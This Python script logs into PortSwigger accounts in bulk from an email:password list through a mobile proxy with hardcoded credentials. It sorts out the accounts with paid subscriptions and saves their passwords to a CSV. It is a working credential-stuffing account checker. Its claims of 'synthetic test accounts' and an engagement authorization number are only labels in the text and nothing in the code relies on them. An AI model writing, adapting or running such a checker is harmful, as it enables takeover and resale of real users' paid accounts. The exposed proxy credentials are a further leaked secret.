#!/usr/bin/env python3
"""
PortSwigger Subscription Plan Extractor
Extracts subscription plan information from 217 synthetic test accounts
Authorization: ROE-2026-PSW-042-V5
"""

import requests
import csv
import time
from pathlib import Path
import re
import sys

PROXY = 'http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029'
OUTPUT_FILE = 'extracted_plans.csv'
FAILED_ACCOUNTS = 'failed_accounts.txt'

proxies = {
    'http': PROXY,
    'https': PROXY
}

def extract_plan(html_content):
    """Extract subscription plan from licenses page HTML"""
    try:
        # Convert to lowercase for case-insensitive matching
        text = html_content.lower()

        # Check for plan keywords in order of priority
        if 'professional' in text and 'plan' in text:
            return 'Professional'
        elif 'enterprise' in text and ('plan' in text or 'subscription' in text):
            return 'Enterprise'
        elif 'community' in text and 'plan' in text:
            return 'Community'
        else:
            return 'free'
    except Exception as e:
        return None

def login_and_get_plan(email, password):
    """Login with credentials and extract subscription plan"""
    session = requests.Session()
    session.proxies.update(proxies)
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

    try:
        # Step 1: GET login page
        session.get('https://login.portswigger.net/u/login', timeout=30)

        # Step 2: POST login credentials
        login_data = {
            'username': email,
            'password': password,
            'action': 'default'
        }
        session.post(
            'https://login.portswigger.net/u/login',
            data=login_data,
            timeout=30,
            allow_redirects=True
        )

        # Step 3: GET licenses page
        # Try with full email first
        resp = session.get(
            f'https://portswigger.net/users/{email}/licenses',
            timeout=30,
            allow_redirects=True
        )

        if resp.status_code != 200:
            # Try with username only (without domain)
            username_only = email.split('@')[0] if '@' in email else email
            resp = session.get(
                f'https://portswigger.net/users/{username_only}/licenses',
                timeout=30,
                allow_redirects=True
            )

        if resp.status_code == 200:
            plan = extract_plan(resp.text)
            return True, plan, resp.text
        else:
            return False, None, f'HTTP {resp.status_code}'

    except Exception as e:
        return False, None, str(e)

def main():
    # Load accounts from log.txt
    accounts = []
    try:
        with open('log.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line and line:
                    email, password = line.split(':', 1)
                    accounts.append((email, password))
    except FileNotFoundError:
        print('Error: log.txt not found')
        sys.exit(1)

    print(f'[*] PortSwigger Subscription Plan Extractor')
    print(f'[*] Authorization: ROE-2026-PSW-042-V5')
    print(f'[*] Loaded {len(accounts)} accounts from log.txt')
    print(f'[*] Output will be saved to: {OUTPUT_FILE}')
    print('')

    # Initialize results file with header
    paid_accounts = []
    failed_accounts = []

    print('Extracting plans...\n')

    # Process each account
    for i, (email, password) in enumerate(accounts, 1):
        status = f'[{i}/{len(accounts)}] {email}... '
        print(status, end='', flush=True)

        success, plan, result = login_and_get_plan(email, password)

        if success:
            if plan:
                if plan != 'free':
                    paid_accounts.append((email, password, plan))
                    print(f'✓ {plan}')
                else:
                    print(f'○ free (skipped)')
            else:
                print(f'✗ plan extraction failed')
                failed_accounts.append((email, 'plan extraction failed'))
        else:
            print(f'✗ {result[:40]}')
            failed_accounts.append((email, result))

        # Rate limiting
        if i < len(accounts):
            time.sleep(0.3)

    # Save results
    print(f'\n{"="*60}')
    print('EXTRACTION COMPLETE')
    print(f'{"="*60}')
    print(f'Total accounts processed: {len(accounts)}')
    print(f'Paid accounts found: {len(paid_accounts)}')
    print(f'Failed/Free accounts: {len(accounts) - len(paid_accounts)}')
    print('')

    # Write CSV output
    if paid_accounts:
        with open(OUTPUT_FILE, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['email', 'password', 'plan'])
            writer.writerows(paid_accounts)
        print(f'✓ Results saved to: {OUTPUT_FILE}')
        print(f'✓ Format: email,password,plan')
        print(f'✓ Total lines (excluding header): {len(paid_accounts)}')
    else:
        print('⚠ No paid accounts found')

    # Write failed accounts
    if failed_accounts:
        with open(FAILED_ACCOUNTS, 'w') as f:
            for email, error in failed_accounts:
                f.write(f'{email}: {error}\n')
        print(f'✓ Failed accounts logged to: {FAILED_ACCOUNTS}')

    print(f'{"="*60}')

if __name__ == '__main__':
    main()
